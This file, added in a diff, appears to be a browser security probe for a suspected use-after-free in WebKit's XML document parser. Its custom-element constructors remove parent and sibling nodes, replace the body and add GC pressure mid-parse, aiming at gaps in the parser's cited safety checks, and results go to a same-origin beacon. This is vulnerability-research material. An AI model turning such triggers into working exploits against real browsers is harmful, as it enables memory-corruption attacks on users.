@@ -1,0 +1,302 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>V443</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<script type="text/javascript"><![CDATA[
+// V443: XHTML Custom Element UAF probe
+// Tests whether CE constructors fire during XMLParser element creation,
+// and if so, tests aggressive DOM mutations for parser state corruption.
+//
+// XMLDocumentParserLibxml2.cpp:843 — customElementReactionStack.reset()
+// runs CE constructor. Safety checks at :858-861 check m_currentNode null,
+// newElement reparented, document mismatch. We test mutations NOT caught
+// by those checks.
+//
+// Source: InternalReadableStream.cpp:191 (S1), XMLDocumentParserLibxml2.cpp:809-876
+
+var BQ = 0;
+function B(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", "/beacon/V443-" + tag + "?q=" + (BQ++), false);
+    x.setRequestHeader("Content-Type", "text/plain");
+    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
+  } catch(e) {}
+}
+
+B("BOOT");
+
+var ceLog = [];
+var phase = "init";
+var nodeAliveMarkers = {};
+
+// Phase 1: Test if CE constructors fire at all
+if (typeof customElements === "undefined") {
+  B("ABORT", "customElements undefined");
+} else {
+  B("CE-API-OK");
+
+  // T1: Basic CE — just count constructor invocations
+  var t1Count = 0;
+  class T1CE extends HTMLElement {
+    constructor() {
+      super();
+      t1Count++;
+      ceLog.push("T1-" + t1Count);
+    }
+  }
+  customElements.define("t1-ce", T1CE);
+
+  // T2: CE that removes its own parent from DOM
+  // After constructor: parser safety check tests m_currentNode null — but
+  // removing the parent doesn't null m_currentNode (it's a raw pointer with ref)
+  var t2Fired = false;
+  var t2ParentRemoved = false;
+  class T2CE extends HTMLElement {
+    constructor() {
+      super();
+      t2Fired = true;
+      ceLog.push("T2-fire");
+      try {
+        var target = document.getElementById("t2-parent");
+        if (target && target.parentNode) {
+          target.parentNode.removeChild(target);
+          t2ParentRemoved = true;
+          ceLog.push("T2-parentRemoved");
+        }
+      } catch(e) { ceLog.push("T2-err:" + e.message.slice(0,40)); }
+    }
+  }
+  customElements.define("t2-ce", T2CE);
+
+  // T3: CE that causes heavy GC pressure during construction
+  // If parser holds weak refs, GC could collect parser-related objects
+  var t3Fired = false;
+  class T3CE extends HTMLElement {
+    constructor() {
+      super();
+      t3Fired = true;
+      ceLog.push("T3-fire");
+      try {
+        // Heavy allocation to trigger GC
+        for (var i = 0; i < 10000; i++) {
+          var a = new ArrayBuffer(1024);
+        }
+        ceLog.push("T3-gc-pressure-done");
+      } catch(e) { ceLog.push("T3-err:" + e.message.slice(0,40)); }
+    }
+  }
+  customElements.define("t3-ce", T3CE);
+
+  // T4: CE that removes a sibling node already processed by parser
+  // Parser's m_currentNodeStack holds refs to ancestors, not siblings.
+  // Removing a sibling AFTER it was parsed might expose stale refs in other systems.
+  var t4Fired = false;
+  class T4CE extends HTMLElement {
+    constructor() {
+      super();
+      t4Fired = true;
+      ceLog.push("T4-fire");
+      try {
+        var sib = document.getElementById("t4-sibling");
+        if (sib && sib.parentNode) {
+          sib.parentNode.removeChild(sib);
+          ceLog.push("T4-sibRemoved");
+        }
+      } catch(e) { ceLog.push("T4-err:" + e.message.slice(0,40)); }
+    }
+  }
+  customElements.define("t4-ce", T4CE);
+
+  // T5: CE that creates ANOTHER custom element during construction
+  // Tests nested CE constructor re-entrancy during XMLParser
+  var t5Fired = false;
+  var t5NestedCount = 0;
+  class T5Inner extends HTMLElement {
+    constructor() {
+      super();
+      t5NestedCount++;
+      ceLog.push("T5-nested-" + t5NestedCount);
+    }
+  }
+  customElements.define("t5-inner", T5Inner);
+
+  class T5CE extends HTMLElement {
+    constructor() {
+      super();
+      t5Fired = true;
+      ceLog.push("T5-fire");
+      try {
+        var el = document.createElement("t5-inner");
+        ceLog.push("T5-created-inner");
+        var container = document.getElementById("t5-container");
+        if (container) {
+          container.appendChild(el);
+          ceLog.push("T5-appended-inner");
+        }
+      } catch(e) { ceLog.push("T5-err:" + e.message.slice(0,40)); }
+    }
+  }
+  customElements.define("t5-ce", T5CE);
+
+  // T6: CE that replaces document.body during construction
+  // Tests if parser continues with stale m_currentNode ancestor
+  var t6Fired = false;
+  class T6CE extends HTMLElement {
+    constructor() {
+      super();
+      t6Fired = true;
+      ceLog.push("T6-fire");
+      try {
+        var newBody = document.createElement("body");
+        newBody.id = "new-body";
+        var html = document.documentElement;
+        if (html && document.body) {
+          html.removeChild(document.body);
+          html.appendChild(newBody);
+          ceLog.push("T6-bodyReplaced");
+        }
+      } catch(e) { ceLog.push("T6-err:" + e.message.slice(0,40)); }
+    }
+  }
+  customElements.define("t6-ce", T6CE);
+
+  // T7: MutationObserver during microtask checkpoint (line 822)
+  // performMicrotaskCheckpoint() runs BEFORE createElement at line 826
+  var t7MoFired = false;
+  if (typeof MutationObserver !== "undefined") {
+    var moTarget = null;
+    var mo = new MutationObserver(function(mutations) {
+      t7MoFired = true;
+      ceLog.push("T7-MO-fired");
+      // Mutate during microtask checkpoint — before CE element is created
+      try {
+        var t7c = document.getElementById("t7-container");
+        if (t7c) {
+          while (t7c.firstChild) t7c.removeChild(t7c.firstChild);
+          ceLog.push("T7-MO-cleared");
+        }
+      } catch(e) { ceLog.push("T7-MO-err:" + e.message.slice(0,40)); }
+    });
+  }
+  class T7CE extends HTMLElement {
+    constructor() {
+      super();
+      ceLog.push("T7-fire");
+    }
+  }
+  customElements.define("t7-ce", T7CE);
+}
+]]></script>
+</head>
+<body>
+<!-- T1: Basic CE constructor test -->
+<div id="t1-container">
+  <t1-ce id="t1-a">a</t1-ce>
+  <t1-ce id="t1-b">b</t1-ce>
+</div>
+
+<!-- T2: Remove parent during CE construction -->
+<div id="t2-outer">
+  <div id="t2-parent">
+    <t2-ce id="t2-elem">t2</t2-ce>
+    <div id="t2-after">after-t2</div>
+  </div>
+</div>
+
+<!-- T3: GC pressure during CE construction -->
+<div id="t3-container">
+  <t3-ce id="t3-elem">t3</t3-ce>
+</div>
+
+<!-- T4: Remove previously-parsed sibling during CE construction -->
+<div id="t4-container">
+  <div id="t4-sibling">sibling-content</div>
+  <t4-ce id="t4-elem">t4</t4-ce>
+</div>
+
+<!-- T5: Nested CE creation during construction -->
+<div id="t5-container">
+  <t5-ce id="t5-elem">t5</t5-ce>
+</div>
+
+<!-- T6: Replace document.body during construction -->
+<div id="t6-container">
+  <t6-ce id="t6-elem">t6</t6-ce>
+</div>
+
+<!-- T7: MutationObserver + CE — trigger MO before CE element is created -->
+<div id="t7-container">
+  <div id="t7-watched">watched</div>
+  <script type="text/javascript"><![CDATA[
+  // Arm MO on t7-watched JUST before parser encounters t7-ce
+  // When parser hits t7-ce, it calls performMicrotaskCheckpoint() at :822
+  // which should fire pending MO callbacks BEFORE createElement at :826
+  if (typeof MutationObserver !== "undefined") {
+    var t7w = document.getElementById("t7-watched");
+    if (t7w && mo) {
+      mo.observe(t7w, { childList: true, subtree: true });
+      // Trigger a mutation that will be queued
+      t7w.appendChild(document.createTextNode("trigger"));
+      ceLog.push("T7-MO-armed");
+    }
+  }
+  ]]></script>
+  <t7-ce id="t7-elem">t7</t7-ce>
+</div>
+
+<script type="text/javascript"><![CDATA[
+// Post-parse report
+B("PARSED");
+B("T1-COUNT", t1Count);
+B("CE-LOG", ceLog.join("|"));
+
+// Individual test results
+B("T2", JSON.stringify({fired: t2Fired, parentRemoved: t2ParentRemoved,
+  t2ParentExists: !!document.getElementById("t2-parent"),
+  t2AfterExists: !!document.getElementById("t2-after")}));
+B("T3", JSON.stringify({fired: t3Fired}));
+B("T4", JSON.stringify({fired: t4Fired,
+  siblingExists: !!document.getElementById("t4-sibling")}));
+B("T5", JSON.stringify({fired: t5Fired, nestedCount: t5NestedCount,
+  innerExists: !!document.querySelector("t5-inner")}));
+B("T6", JSON.stringify({fired: t6Fired,
+  bodyId: document.body ? document.body.id : "null",
+  t6ContainerExists: !!document.getElementById("t6-container")}));
+B("T7", JSON.stringify({moFired: t7MoFired}));
+
+// Check for signs of parser corruption
+var corruption = [];
+try {
+  // Check if document structure is intact
+  var body = document.body;
+  if (!body) corruption.push("no-body");
+  if (body && body.id === "new-body") corruption.push("body-replaced");
+
+  // Check child count anomalies
+  var t1c = document.getElementById("t1-container");
+  if (t1c) {
+    var actualT1 = t1c.querySelectorAll("t1-ce").length;
+    if (actualT1 !== 2) corruption.push("t1-count-" + actualT1);
+  }
+
+  // Check for orphaned nodes (sign of parser stack corruption)
+  var allCE = document.querySelectorAll("t1-ce, t2-ce, t3-ce, t4-ce, t5-ce, t6-ce, t7-ce");
+  B("CE-TOTAL", allCE.length);
+
+  // Try to access potentially corrupted state
+  var nodeCount = 0;
+  var walker = document.createTreeWalker(document, 0xFFFFFFFF);
+  while (walker.nextNode()) nodeCount++;
+  B("NODE-COUNT", nodeCount);
+
+} catch(e) {
+  corruption.push("scan-err:" + e.message.slice(0,40));
+}
+
+B("CORRUPTION", corruption.length > 0 ? corruption.join("|") : "none");
+B("DONE");
+]]></script>
+</body>
+</html>
